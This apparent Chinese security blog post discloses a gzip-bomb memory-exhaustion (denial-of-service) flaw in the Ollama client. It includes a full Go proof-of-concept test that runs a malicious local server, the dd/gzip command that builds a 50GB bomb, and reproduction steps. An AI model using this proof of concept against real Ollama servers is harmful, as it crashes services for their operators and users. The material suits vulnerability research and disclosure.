#  Ollama被爆DDOS攻击漏洞   
原创 安全闲谈  柯基的安全笔记   2025-03-14 23:34  
  
## 前言  
  
我们在Ollama客户端发现了一个漏洞，当恶意API服务器对GZIP BOMB HTTP响应响应请求时，可以触发。此漏洞可能会导致内存（OOM）攻击，从而导致Ollama服务器崩溃。  
## 复现步骤  
  
获取最新的ollama  
```
git clone https://github.com/ollama/ollamacd ollamagit checkout f2890a4494f9fb3722ee7a4c506252362d1eab65
```  
  
漏洞poc  
```
package serverimport (    "context"    "crypto/ed25519"    "crypto/rand"    "encoding/pem"    "fmt"    "golang.org/x/crypto/ssh"    "net/http"    "net/url"    "os"    "path/filepath"    "runtime"    "testing")// 1GBconst LimitRamUsage = 1024 * 1024 * 1024func TestMakeRequestWithRetryAuth(t *testing.T) {    if err := initializeKeypair(); err != nil {        t.Fatalf("failed to initialize keypair: %v", err)    }    go startTestServerOOM(t)    defer runtime.GOMAXPROCS(runtime.GOMAXPROCS(1))    var start, end runtime.MemStats    runtime.GC()    runtime.ReadMemStats(&start)    processGzipBombAuth(t)    runtime.ReadMemStats(&end)    alloc := end.TotalAlloc - start.TotalAlloc    if alloc > LimitRamUsage {        t.Fatalf("Memory usage exceeded limit: %d", alloc)    }}func TestMakeRequestWithRetry(t *testing.T) {    go startTestServerOOM(t)    defer runtime.GOMAXPROCS(runtime.GOMAXPROCS(1))    var start, end runtime.MemStats    runtime.GC()    runtime.ReadMemStats(&start)    processGzipBomb(t)    runtime.ReadMemStats(&end)    alloc := end.TotalAlloc - start.TotalAlloc    if alloc > LimitRamUsage {        t.Fatalf("Memory usage exceeded limit: %d", alloc)    }}func processGzipBombAuth(t *testing.T) {    u, err := url.Parse("http://localhost:8080")    if err != nil {        t.Fatalf("failed to parse url: %v", err)    }    _, err = makeRequestWithRetry(        context.TODO(),        "POST",        u,        nil,        nil,        &registryOptions{CheckRedirect: func(req *http.Request, via []*http.Request) error {            return nil        }},    )    if err != nil {        t.Fatalf("failed to make request with retry: %v", err)    }}func processGzipBomb(t *testing.T) {    u, err := url.Parse("http://localhost:8080")    if err != nil {        t.Fatalf("failed to parse url: %v", err)    }    _, err = makeRequestWithRetry(        context.TODO(),        "Get",        u,        nil,        nil,        &registryOptions{CheckRedirect: func(req *http.Request, via []*http.Request) error {            return nil        }},    )    if err != nil {        t.Fatalf("failed to make request with retry: %v", err)    }}func startTestServerOOM(t *testing.T) {    http.HandleFunc("/", handleRequestOOM)    t.Fatal(http.ListenAndServe(":8080", nil))}func handleRequestOOM(w http.ResponseWriter, r *http.Request) {    fmt.Printf("Request: %s %s\n", r.Method, r.URL.Path)    switch r.Method {    case "POST":        // Set headers www-authenticate and write 401        w.Header().Set("WWW-Authenticate", `Bearer realm="http://localhost:8080",service="registry.docker.io",scope="repository:library/hello-world:pull"`)        w.WriteHeader(http.StatusUnauthorized)        if _, err := w.Write([]byte("Unauthorized")); err != nil {            return        }    case "GET":        // Created with: `dd if=/dev/zero bs=1M count=50000 | gzip > 50G.gzip`        content, err := os.ReadFile("50G.gzip")        if err != nil {            http.Error(w, "File not found", http.StatusNotFound)            return        }        w.Header().Set("Content-Encoding", "gzip")        w.WriteHeader(http.StatusTeapot)        if _, err := w.Write(content); err != nil {            return        }    }}func initializeKeypair() error {    home, err := os.UserHomeDir()    if err != nil {        return err    }    privKeyPath := filepath.Join(home, ".ollama", "id_ed25519")    pubKeyPath := filepath.Join(home, ".ollama", "id_ed25519.pub")    _, err = os.Stat(privKeyPath)    if os.IsNotExist(err) {        fmt.Printf("Couldn't find '%s'. Generating new private key.\n", privKeyPath)        cryptoPublicKey, cryptoPrivateKey, err := ed25519.GenerateKey(rand.Reader)        if err != nil {            return err        }        privateKeyBytes, err := ssh.MarshalPrivateKey(cryptoPrivateKey, "")        if err != nil {            return err        }        if err := os.MkdirAll(filepath.Dir(privKeyPath), 0o755); err != nil {            return fmt.Errorf("could not create directory %w", err)        }        if err := os.WriteFile(privKeyPath, pem.EncodeToMemory(privateKeyBytes), 0o600); err != nil {            return err        }        sshPublicKey, err := ssh.NewPublicKey(cryptoPublicKey)        if err != nil {            return err        }        publicKeyBytes := ssh.MarshalAuthorizedKey(sshPublicKey)        if err := os.WriteFile(pubKeyPath, publicKeyBytes, 0o644); err != nil {            return err        }        fmt.Printf("Your new public key is: \n\n%s\n", publicKeyBytes)    }    return nil}
```  
  
创建一个文件50G.GZIP，大小为50GB。  
```
cd ollama/serverdd if=/dev/zero bs=1M count=50000 | gzip > 50G.gzip
```  
  
运行testmakerequestwithretry  
```
go test -v -run TestMakeRequestWithRetry
```  
  
读取状态  
```
dmesg
```  
  
运行TestMakeRequestWithRetryAuth  
```
go test -v -run TestMakeRequestWithRetry
```  
  
读取状态  
```
dmesg
```  
## 漏洞影响  
  
攻击者可以利用这种脆弱性崩溃的Ollama服务器，这可能导致拒绝服务（DOS）  
  
  
